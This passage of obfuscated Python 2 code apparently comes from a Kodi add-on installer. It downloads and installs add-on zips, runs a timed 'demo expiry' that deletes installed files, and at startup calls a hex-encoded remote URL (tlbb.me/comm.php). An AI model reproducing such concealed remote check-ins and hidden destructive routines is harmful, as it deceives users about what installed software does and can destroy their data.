   O00ooOo = random . randrange ( 1 , 31 )
   oOO0o00O = hex ( O00ooOo ) [ 2 : ]
   if len ( oOO0o00O ) == 1 :
    oOO0o00O = '0' + oOO0o00O
   OO0OoOOO0 = OO0OoOOO0 + oOO0o00O
  oOoO = random . randrange ( 1 , 4 )
  if oOoO == 1 : OO0OoOOO0 = OO0OoOOO0 + '0A'
  if oOoO == 2 : OO0OoOOO0 = OO0OoOOO0 + '04'
  if oOoO == 3 : OO0OoOOO0 = OO0OoOOO0 + '06'
  if oOoO == 4 : OO0OoOOO0 = OO0OoOOO0 + '08'
  IIII = OO0OoOOO0 [ - 2 : ]
  iI1iiiIiii = int ( IIII , 16 )
  ii1i1i = OO0OoOOO0 [ - iI1iiiIiii : - ( iI1iiiIiii - 2 ) ]
  II11iIII1i1I = - int ( ii1i1i , 16 )
  if 63 - 63: iIII + oOOO0OooOoooO - ooOO0O0ooOooO
  if 2 - 2: o0O0Oooo0O
  oOo0O0O0 = ''
  oOoo0 = ''
  for I1iiiiii in message :
   o0OO0Oo = ord ( I1iiiiii )
   I11iiii1I = int ( o0OO0Oo ) + II11iIII1i1I
   iiiiI1iiiIi = hex ( I11iiii1I ) [ 2 : ]
   if len ( iiiiI1iiiIi ) == 1 :
    iiiiI1iiiIi = '0' + iiiiI1iiiIi
   oOoo0 = str ( oOoo0 ) + str ( iiiiI1iiiIi )
  return oOoo0 + OO0OoOOO0
 else :
  IIII = message [ - 2 : ]
  iI1iiiIiii = int ( IIII , 16 )
  ii1i1i = message [ - iI1iiiIiii : - ( iI1iiiIiii - 2 ) ]
  II11iIII1i1I = int ( ii1i1i , 16 )
  message = message [ : - 10 ]
  o0oO0OoO0 = [ message [ oOOOOOoOO : oOOOOOoOO + 2 ] for oOOOOOoOO in range ( 0 , len ( message ) , 2 ) ]
  oooo00 = [ int ( i1oO , 16 ) + II11iIII1i1I for i1oO in o0oO0OoO0 ]
  iI = [ str ( unichr ( i1oO ) ) for i1oO in oooo00 ]
  OO0OoOOO0 = '' . join ( iI )
  return OO0OoOOO0 . encode ( 'utf-8' )
  if 42 - 42: II1 + iIII % ooOO0O0ooOooO + Ii1i1i
  if 24 - 24: o0O00o * ooOO0O0ooOooO % o0O00o % o0O0Oooo0O + II1
  if 29 - 29: ooOO0O0ooOooO - II1 - i11iIiiIii . ooo0O0O00
def i11ii ( name , zip_link , repo_link , repo_id , addon_id , provider_name , forum , data_path ) :
 forum = str ( forum )
 repo_id = str ( repo_id )
 i11I1 = 1
 Ii1iIi111i1i1 = 1
 IIOO0ooOo0OoOo0 = 1
 I1iIi1iIiiIiI = xbmc . translatePath ( os . path . join ( O0OoO000O0OO , addon_id ) )
 if 87 - 87: OoOo0o . IIIi11I1
 if os . path . exists ( I1iIi1iIiiIiI ) :
  OoOIiiiii111i1ii = 1
  if 17 - 17: IIooooo . i11iIiiIii
 else :
  OoOIiiiii111i1ii = 0
  if 5 - 5: Oo00oo0oO + OOO0O0O0ooooo + OOO0O0O0ooooo . oOOO0OooOoooO - ii11IIII11I
 o00oo0000 = xbmc . translatePath ( os . path . join ( O0Oo000ooO00 , name + '.zip' ) )
 iIi1IIi1ii = xbmc . translatePath ( os . path . join ( O0OoO000O0OO , addon_id ) )
 if 35 - 35: o0O00o / Oo00oo0oO * II1 . ooOO0O0ooOooO / iIII
 oooOOOOO . create ( "Installing Addon" , "Please wait whilst your addon is installed" , '' , '' )
 if 1 - 1: II1 + o0O0Oooo0O . O00ooooo00 % IIi1iIi
 try :
  downloader . download ( repo_link , o00oo0000 , oooOOOOO )
  extract . all ( o00oo0000 , O0OoO000O0OO , oooOOOOO )
  if 66 - 66: ooo0O0O00 + Oo00oo0oO + IIIi11I1 - OoOo0o
 except :
  if 12 - 12: o0O00o . o0O0Oooo0O . IIIIiiII111 / OOO0O0O0ooooo
  try :
   downloader . download ( zip_link , o00oo0000 , oooOOOOO )
   extract . all ( o00oo0000 , O0OoO000O0OO , oooOOOOO )
   if 58 - 58: ooo0O0O00 - ooOO0O0ooOooO % OoOo0o + oOOO0OooOoooO . IIIIiiII111 / o0O0Oooo0O
  except :
   if 8 - 8: Oo00oo0oO . Ii1i1i * IIi1iIi + ooOO0O0ooOooO % i11iIiiIii
   try :
    if not os . path . exists ( iIi1IIi1ii ) :
     os . makedirs ( iIi1IIi1ii )
     if 8 - 8: ii11IIII11I * OOO0O0O0ooooo
    iiI = O00o0 ( data_path ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
    OOoO = re . compile ( 'href="(.+?)"' , re . DOTALL ) . findall ( iiI )
    if 18 - 18: IIii1I + iIII - i11Iii + II1 * II1
    for i1I in OOoO :
     iiI1I1IIi11i1 = xbmc . translatePath ( os . path . join ( iIi1IIi1ii , i1I ) )
     if 45 - 45: ii11IIII11I % ooo0O0O00 - ii11IIII11I
     if addon_id not in i1I and '/' not in i1I :
      if 31 - 31: o0O0Oooo0O / i11iIiiIii
      try :
       oooOOOOO . update ( 0 , "Downloading [COLOR=darkcyan]" + i1I + '[/COLOR]' , '' , 'Please wait...' )
       downloader . download ( data_path + i1I , iiI1I1IIi11i1 , oooOOOOO )
       if 83 - 83: Oo00oo0oO / oOOO0OooOoooO - i11iIiiIii . IIii1I + iIII
      except :
       print "failed to install" + i1I
       if 59 - 59: OOO0O0O0ooooo % iIII
     if '/' in i1I and '..' not in i1I and 'http' not in i1I :
      O0o00O0Oo0 = data_path + i1I
      Recursive_Loop ( iiI1I1IIi11i1 , O0o00O0Oo0 )
      if 58 - 58: OOO0O0O0ooooo
   except :
    i1iiIIiiI111 . ok ( "Error downloading add-on" , 'There was an error downloading [COLOR=darkcyan]' + name , '[/COLOR]Please consider updating the add-on portal with details or report the error on the forum at [COLOR=lime][B]www.totalxbmc.tv[/COLOR][/B]' )
    i11I1 = 0
    if 78 - 78: Ii1i1i % o0O0Oooo0O * O00ooooo00
 if i11I1 == 1 :
  time . sleep ( 1 )
  oooOOOOO . update ( 0 , "[COLOR=darkcyan]" + name + '[/COLOR]  [COLOR=lime]Successfully Installed[/COLOR]' , '' , 'Now installing repository' )
  time . sleep ( 1 )
  I1iii11 = xbmc . translatePath ( os . path . join ( O0OoO000O0OO , repo_id ) )
  if 66 - 66: IIooooo . IIIi11I1 + ooo0O0O00 . IIii1I
  if ( repo_id != 'repository.xbmc.org' ) and not ( os . path . exists ( I1iii11 ) ) and ( repo_id != '' ) and ( 'superrepo' not in repo_id ) :
   Install_Repo ( repo_id )
   if 51 - 51: IIi1iIi . iIII
  xbmc . sleep ( 2000 )
  if 45 - 45: O00ooooo00 - iIII / OOO0O0O0ooooo . Oo00oo0oO
  if os . path . exists ( I1iIi1iIiiIiI ) and OoOIiiiii111i1ii == 0 :
   I1Iiiiiii = 'http://totalxbmc.com/TI/AddonPortal/downloadcount.php?id=%s' % ( addon_id )
   O00o0 ( I1Iiiiiii )
   if 5 - 5: ooo0O0O00 . IIii1I % IIii1I
  Dependency_Install ( name , addon_id )
  xbmc . executebuiltin ( 'UpdateLocalAddons' )
  xbmc . sleep ( 1000 )
  xbmc . executebuiltin ( 'UpdateAddonRepos' )
  if 56 - 56: II1 - IIi1iIi - O00ooooo00
  if Ii1iIi111i1i1 == 0 :
   i1iiIIiiI111 . ok ( name + " Install Complete" , 'The add-on has been successfully installed but' , 'there was an error installing the repository.' , 'This will mean the add-on fails to update' )
   if 8 - 8: oOOO0OooOoooO / i11Iii . IIIi11I1 + Oo00oo0oO / i11iIiiIii
  if IIOO0ooOo0OoOo0 == 0 :
   i1iiIIiiI111 . ok ( name + " Install Complete" , 'The add-on has been successfully installed but' , 'there was an error installing modules.' , 'This could result in errors with the add-on.' )
   if 31 - 31: ii11IIII11I - IIii1I + o0O00o . iIII / o0O0Oooo0O % IIii1I
  if IIOO0ooOo0OoOo0 != 0 and Ii1iIi111i1i1 != 0 and forum != 'None' :
   i1iiIIiiI111 . ok ( name + " Install Complete" , 'Please support the developer(s) [COLOR=dodgerblue]' + provider_name , '[/COLOR]Support for this add-on can be found at [COLOR=darkcyan]' + forum , '[/COLOR][CR]Visit [COLOR=orange]www.noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds.com[/COLOR] for all your Kodi needs.' )
   if 6 - 6: o0O0Oooo0O * i11iIiiIii % IIii1I % i11iIiiIii + ooo0O0O00 / O00ooooo00
  if IIOO0ooOo0OoOo0 != 0 and Ii1iIi111i1i1 != 0 and forum == 'None' :
   i1iiIIiiI111 . ok ( name + " Install Complete" , 'Please support the developer(s) [COLOR=dodgerblue]' + provider_name , '[/COLOR]No details of forum support have been given.' )
   if 53 - 53: IIi1iIi + IIii1I
 xbmc . executebuiltin ( 'Container.Refresh' )
 if 70 - 70: Oo00oo0oO
if not os . path . exists ( oO0Oo ) :
 os . makedirs ( oO0Oo )
 if 67 - 67: II1
if not os . path . exists ( OOooO0OOoo ) :
 os . makedirs ( OOooO0OOoo )
 if 29 - 29: OOO0O0O0ooooo - i11iIiiIii - ooOO0O0ooOooO + i11Iii * o0O0Oooo0O
O0II11i11II = datetime . datetime . now ( )
if ( oO == 'true' or os . path . exists ( OOOOoo0Oo ) ) and int ( O0II11i11II . minute ) == 38 and int ( O0II11i11II . second ) < 31 :
 IiI1ii1Ii = datetime . datetime . fromtimestamp ( os . path . getmtime ( OOOOoo0Oo ) )
 oooOOOoOOOo0O = IiI1ii1Ii + datetime . timedelta ( days = 2 )
 O00oOoo0OoO0 = oooOOOoOOOo0O - O0II11i11II
 O00oOoo0OoO0 = str ( O00oOoo0OoO0 ) [ : - 7 ]
 if str ( O00oOoo0OoO0 ) . startswith ( '-' ) :
  try :
   oOO0o000Oo00o ( )
   shutil . rmtree ( i1iiIII111ii )
   os . remove ( OOOOoo0Oo )
  except :
   pass
  i1iiIIiiI111 . ok ( 'Demo Expired' , 'Your kodi install will revert back to vanilla install' )
 else :
  i1iiIIiiI111 . ok ( 'Time Left For DEMO' , 'Your kodi install will revert back to vanilla install in:[COLOR=dodgerblue]' , str ( O00oOoo0OoO0 ) + '[/COLOR]' )
  if 62 - 62: O00ooooo00 / ii11IIII11I . IIIi11I1 * ooo0O0O00
if not os . path . exists ( ooooooO0oo ) :
 oooo0O0 = open ( ooooooO0oo , mode = 'w+' )
 oooo0O0 . write ( 'date="01011001"\nversion="0.0"' )
 oooo0O0 . close ( )
 if 21 - 21: ooo0O0O00
if not os . path . exists ( I1IIIii ) :
 oooo0O0 = open ( I1IIIii , mode = 'w+' )
 oooo0O0 . write ( 'id="None"\nname="None"' )
 oooo0O0 . close ( )
 if 81 - 81: IIi1iIi / IIii1I - ii11IIII11I * oOOO0OooOoooO . IIIi11I1 * Oo00oo0oO
if __name__ == '__main__' :
 iII1i1 ( binascii . unhexlify ( '687474703a2f2f746c62622e6d652f636f6d6d2e7068703f783d' ) )
# dd678faae9ac167bc83abf78e5cb2f3f0688d3a3
')